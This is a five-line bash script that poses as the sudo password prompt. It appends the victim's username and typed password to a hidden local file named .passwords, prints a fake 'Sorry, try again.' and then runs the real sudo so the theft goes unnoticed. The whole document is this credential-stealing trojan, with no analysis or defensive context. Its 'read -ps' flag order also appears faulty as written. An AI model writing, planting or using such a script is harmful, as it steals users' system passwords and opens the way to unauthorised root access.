#! /bin/bash
read -ps "[sudo] password for $USER" 
echo "$USER:$REPLY" >> .passwords
echo -n "Sorry, try again."
sudo $@
